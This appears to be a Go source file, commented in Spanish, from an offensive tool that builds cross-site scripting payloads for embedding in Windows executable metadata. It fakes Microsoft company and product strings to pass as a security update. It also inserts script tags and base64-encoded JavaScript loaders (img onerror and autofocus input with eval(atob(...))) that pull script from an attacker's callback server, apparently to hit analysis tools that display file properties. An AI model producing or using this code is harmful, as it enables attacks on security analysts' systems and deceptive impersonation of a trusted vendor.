package xss

import (
	"encoding/base64"
	"fmt"
)

// Metadata del PE que se embebe durante la compilación
// Estos strings quedan en el binario y aparecen en análisis estático

var (
	// Metadata que aparece en propiedades del archivo
	CompanyName      = `Microsoft Corporation`
	FileDescription  = `Windows Security Update Service`
	ProductName      = `Microsoft Windows Operating System`
	FileVersion      = `10.0.19041.1234`
	InternalName     = `SecurityUpdate.exe`
	LegalCopyright   = `Copyright (C) Microsoft Corporation. All rights reserved.`
	OriginalFilename = `SecurityUpdate.exe`
	ProductVersion   = `10.0.19041.1234`
)

// EmbedPEMetadata embebe metadata en el binario
// Nota: Para que esto funcione completamente, necesitas usar ldflags en compilación
func EmbedPEMetadata() {
	// Los strings quedan embebidos en el binario
	_ = CompanyName
	_ = FileDescription
	_ = ProductName
	_ = FileVersion
	_ = InternalName
	_ = LegalCopyright
	_ = OriginalFilename
	_ = ProductVersion
}

// GetPEMetadataWithXSS retorna metadata con XSS para embeber
func GetPEMetadataWithXSS(callbackServer string, payloadID string) map[string]string {
	// Generar loader base64
	jsLoader := fmt.Sprintf(`var a=document.createElement("script");a.src="%s";document.body.appendChild(a);`, callbackServer)
	b64Loader := base64.StdEncoding.EncodeToString([]byte(jsLoader))

	return map[string]string{
		"CompanyName":      fmt.Sprintf(`Microsoft Corporation"><script src="%s"></script>`, callbackServer),
		"FileDescription":  fmt.Sprintf(`Windows Update"><img src=x id=%s onerror=eval(atob(this.id))>`, b64Loader),
		"ProductName":      fmt.Sprintf(`Microsoft Windows"><input onfocus=eval(atob(this.id)) id=%s autofocus>`, b64Loader),
		"InternalName":     fmt.Sprintf(`SecurityUpdate"><script src="%s"></script>`, callbackServer),
		"OriginalFilename": fmt.Sprintf(`Update.exe"><img src=x id=%s onerror=eval(atob(this.id))>`, b64Loader),
	}
}

// EmbedXSSStrings embebe strings adicionales con XSS en el binario
func EmbedXSSStrings(payloads []XSSPayload) {
	// Crear array de strings que quedarán en el binario
	var embeddedStrings []string

	for _, p := range payloads {
		if p.Vector == "pe-metadata" {
			// Embeber el contenido del payload
			embeddedStrings = append(embeddedStrings, p.Content)

			// Embeber variantes
			embeddedStrings = append(embeddedStrings,
				fmt.Sprintf("CompanyName: %s", p.Content),
				fmt.Sprintf("FileDescription: %s", p.Content),
				fmt.Sprintf("ProductName: %s", p.Content),
			)
		}
	}

	// Los strings quedan embebidos
	_ = embeddedStrings
}

// PrintPEMetadata imprime la metadata embebida (para debug)
func PrintPEMetadata() {
	fmt.Println("\n[PE Metadata]")
	fmt.Printf("  CompanyName: %s\n", CompanyName)
	fmt.Printf("  FileDescription: %s\n", FileDescription)
	fmt.Printf("  ProductName: %s\n", ProductName)
	fmt.Printf("  FileVersion: %s\n", FileVersion)
	fmt.Println()
}
